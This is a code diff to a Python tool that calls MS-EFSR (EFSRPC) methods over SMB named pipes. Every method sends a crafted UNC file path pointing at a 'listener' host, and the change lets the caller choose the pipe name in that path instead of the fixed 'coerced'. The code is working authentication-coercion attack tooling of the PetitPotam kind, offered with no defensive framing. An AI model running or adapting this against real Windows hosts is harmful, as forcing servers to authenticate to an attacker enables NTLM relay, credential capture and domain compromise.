@@ -21,8 +21,9 @@ class MS_EFSR(RPCProtocol):
     uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
     version = "1.0"
     pipe = r"\PIPE\netlogon"
+    
 
-    def EfsRpcFileKeyInfoEx(self, listener):
+    def EfsRpcFileKeyInfoEx(self, listener, namedpipe):
         if self.dce is not None:
             print("[>] Calling EfsRpcFileKeyInfoEx() ...")
             try:
@@ -36,7 +37,7 @@ class MS_EFSR(RPCProtocol):
                 #
                 request['dwFileKeyInfoFlags'] = BASIC_KEY_INFO
                 request['Reserved'] = EFS_RPC_BLOB()
-                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                 request['InfoClass'] = 0
                 # request.dump()
                 resp = self.dce.request(request)
@@ -45,12 +46,12 @@ class MS_EFSR(RPCProtocol):
         else:
             print("[!] Error: dce is None, you must call connect() first.")
     
-    def EfsRpcEncryptFileSrv(self, listener):
+    def EfsRpcEncryptFileSrv(self, listener, namedpipe):
         if self.dce is not None:
             print("[>] Calling EfsRpcEncryptFileSrv() ...")
             try:
                 request = EfsRpcEncryptFileSrv()
-                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
@@ -59,12 +60,12 @@ class MS_EFSR(RPCProtocol):
             print("[!] Error: dce is None, you must call connect() first.")
 
 
-    def EfsRpcDecryptFileSrv(self, listener): # ><> "rpc_x_bad_stub_data" error
+    def EfsRpcDecryptFileSrv(self, listener, namedpipe): # ><> "rpc_x_bad_stub_data" error
         if self.dce is not None:
             print("[>] Calling EfsRpcDecryptFileSrv() ...")
             try:
                 request = EfsRpcDecryptFileSrv()
-                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                 request['OpenFlag'] = 0
                 #request.dump()
                 resp = self.dce.request(request)
@@ -73,7 +74,7 @@ class MS_EFSR(RPCProtocol):
         else:
             print("[!] Error: dce is None, you must call connect() first.")
     
-    def EfsRpcQueryUsersOnFile(self, listener, max_retries=3):
+    def EfsRpcQueryUsersOnFile(self, listener, namedpipe, max_retries=3):
         if self.dce is not None:
             print("[>] Calling EfsRpcQueryUsersOnFile() ...")
             tries = 0
@@ -81,7 +82,7 @@ class MS_EFSR(RPCProtocol):
                 tries += 1
                 try:
                     request = EfsRpcQueryUsersOnFile()
-                    request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                    request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                     # request.dump()
                     resp = self.dce.request(request)
                 except Exception as e:
@@ -97,12 +98,12 @@ class MS_EFSR(RPCProtocol):
             print("[!] Error: dce is None, you must call connect() first.")
         return False
     
-    def EfsRpcQueryRecoveryAgents(self, listener):
+    def EfsRpcQueryRecoveryAgents(self, listener, namedpipe):
         if self.dce is not None:
             print("[>] Calling EfsRpcQueryRecoveryAgents() ...")
             try:
                 request = EfsRpcQueryRecoveryAgents()
-                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
@@ -110,12 +111,12 @@ class MS_EFSR(RPCProtocol):
         else:
             print("[!] Error: dce is None, you must call connect() first.")
 
-    def EfsRpcFileKeyInfo(self, listener):
+    def EfsRpcFileKeyInfo(self, listener, namedpipe):
         if self.dce is not None:
             print("[>] Calling EfsRpcFileKeyInfo() ...")
             try:
                 request = EfsRpcFileKeyInfo()
-                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                 request['InfoClass'] = 0
                 # request.dump()
                 resp = self.dce.request(request)
@@ -124,13 +125,13 @@ class MS_EFSR(RPCProtocol):
         else:
             print("[!] Error: dce is None, you must call connect() first.")
 
-    def EfsRpcDuplicateEncryptionInfoFile(self, listener):
+    def EfsRpcDuplicateEncryptionInfoFile(self, listener, namedpipe):
         if self.dce is not None:
             print("[>] Calling EfsRpcDuplicateEncryptionInfoFile() ...")
             try:
                 request = EfsRpcDuplicateEncryptionInfoFile()
-                request['SrcFileName'] = '\\\\%s/pipe/coerced\\%s\\file123.txt\x00' % (listener, gen_random_name())
-                request['DestFileName'] = '\\\\%s/pipe/coerced\\%s\\file321.txt\x00' % (listener, gen_random_name())
+                request['SrcFileName'] = '\\\\%s/pipe/%s\\%s\\file123.txt\x00' % (listener, namedpipe, gen_random_name())
+                request['DestFileName'] = '\\\\%s/pipe/%s\\%s\\file321.txt\x00' % (listener, namedpipe, gen_random_name())
                 request['dwCreationDisposition'] = 0
                 request['dwAttributes'] = 0
                 request['RelativeSD'] = EFS_RPC_BLOB()
@@ -142,7 +143,7 @@ class MS_EFSR(RPCProtocol):
         else:
             print("[!] Error: dce is None, you must call connect() first.")
 
-    def EfsRpcAddUsersToFileEx(self, listener):
+    def EfsRpcAddUsersToFileEx(self, listener, namedpipe):
         if self.dce is not None:
             print("[>] Calling EfsRpcAddUsersToFileEx() ...")
             try:
@@ -151,7 +152,7 @@ class MS_EFSR(RPCProtocol):
                 EFSRPC_ADDUSERFLAG_REPLACE_DDF = 0x00000004
                 request['dwFlags'] = EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
                 request['Reserved'] = NULL
-                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                 request['EncryptionCertificates'] = NULL
                 #request.dump()
                 resp = self.dce.request(request)
@@ -160,7 +161,7 @@ class MS_EFSR(RPCProtocol):
         else:
             print("[!] Error: dce is None, you must call connect() first.")
 
-    def EfsRpcFileKeyInfoEx(self, listener):
+    def EfsRpcFileKeyInfoEx(self, listener, namedpipe):
         if self.dce is not None:
             print("[>] Calling EfsRpcFileKeyInfoEx() ...")
             try:
@@ -174,7 +175,7 @@ class MS_EFSR(RPCProtocol):
                 #
                 request['dwFileKeyInfoFlags'] = BASIC_KEY_INFO
                 request['Reserved'] = EFS_RPC_BLOB()
-                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['FileName'] = '\\\\%s/pipe/%s\\%s\\file.txt\x00' % (listener, namedpipe, gen_random_name())
                 request['InfoClass'] = 0
                 # request.dump()
                 resp = self.dce.request(request)
